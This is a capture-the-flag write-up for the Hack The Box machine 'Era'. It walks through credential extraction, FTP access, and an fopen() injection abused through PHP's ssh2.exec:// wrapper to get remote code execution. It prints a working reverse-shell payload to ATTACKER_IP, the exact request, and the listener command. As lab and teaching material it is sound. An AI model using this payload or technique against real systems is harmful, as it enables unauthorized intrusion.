HTB Era

Target: 10.129.237.233
OS: Linux
Difficulty: Medium

Enumeration

Nmap showed port 21 (FTP, vsFTPd 3.0.5), port 22 (SSH), and port 80 (HTTP) open. Virtual host enumeration revealed file.era.htb as a subdomain.

The main site at era.htb has a login page and file management functionality. The file.era.htb vhost has a file upload feature and a download page.

SQLite Database

Found a site backup file containing a SQLite database. Extracted credentials from it:

sqlite3 database.db
.tables
SELECT * FROM users;

Discovered two sets of credentials:
Eric: America
Yuri: Mustang

FTP Access

Anonymous FTP login was disabled. Yuri's credentials (Yuri:Mustang) worked for FTP access.

ftp era.htb
Username: yuri
Password: Mustang

Found two directories:
apache2_conf — Apache configuration files
php8.1_conf — PHP 8.1 configuration and extension files

Apache Config Analysis

In apache2_conf found file.conf which revealed the file.era.htb virtual host:

<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/file
    ServerName file.era.htb
</VirtualHost>

PHP Extensions Discovery

In php8.1_conf/build found PHP extension files including ssh2.so. This is critical because it means the PHP installation has the SSH2 extension enabled, which provides the ssh2:// stream wrapper for PHP's file functions (fopen, file_get_contents, etc.).

Admin Panel and download.php Vulnerability

After gaining admin access to the web app, the download.php page has a hidden admin-only feature. Adding show=true to the URL enables a file preview mode instead of downloading.

The code:

if ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
    } else {
        $wrapper = '';
    }

    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
}

The format parameter is concatenated directly into fopen() without sanitization. Since ssh2.so is installed, PHP supports the ssh2.exec:// stream wrapper, which executes commands over SSH.

RCE via ssh2.exec:// Stream Wrapper

The ssh2.exec:// wrapper syntax:
ssh2.exec://username:password@host:port/command

Payload (before URL encoding):
ssh2.exec://eric:america@localhost:22/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1"#

URL-encoded payload:
ssh2.exec://eric:america@localhost:22/bash+-c+"bash+-i+>%26+/dev/tcp/ATTACKER_IP/9001+0>%261"%23

The # at the end is critical. The code appends the filename (files/site-backup-30-08-24.zip) to the wrapper string. The # turns everything after it into a URL fragment that gets discarded, preventing the appended filename from breaking the command. Same concept as SQL injection comments (-- -) cutting off the rest of a query.

Eric's credentials worked for SSH (but not FTP), while Yuri's worked for FTP (but not SSH). Different services, different valid credentials.

Set up listener first:
nc -lvnp 9001

Send the request through Burp Repeater with the admin session cookie:
GET /download.php?id=54&show=true&format=ssh2.exec://eric:america@localhost:22/bash+-c+"bash+-i+>%26+/dev/tcp/ATTACKER_IP/9001+0>%261"%23

Got shell as eric.

Privilege Escalation

TODO

Key Lessons

1. PHP stream wrappers go beyond php://filter. When fopen() or similar functions accept user input, any installed PHP extension that registers a wrapper becomes an attack surface
2. ssh2.exec:// lets you run commands over SSH through PHP's file handling functions. It requires the ssh2.so extension to be installed
3. Always check what PHP extensions are installed on a target. FTP backups of PHP config directories reveal this. Key extensions to look for: ssh2.so, expect.so, zip://, phar://
4. The # (fragment) trick discards appended strings in URL-like contexts, similar to how -- - works in SQL injection
5. Different services may accept different credentials. Always try all discovered credentials against all services (FTP, SSH, web logins, databases)
6. Site backup files are goldmines. They contain database files, configuration, credentials, and source code that reveal the application's inner workings
7. Admin-only features in source code (like show=true in download.php) are hidden functionality that may have weaker security since developers assume only admins will access them
8. SQLite databases can be read with sqlite3 command line tool: .tables to list tables, SELECT * FROM tablename to dump contents
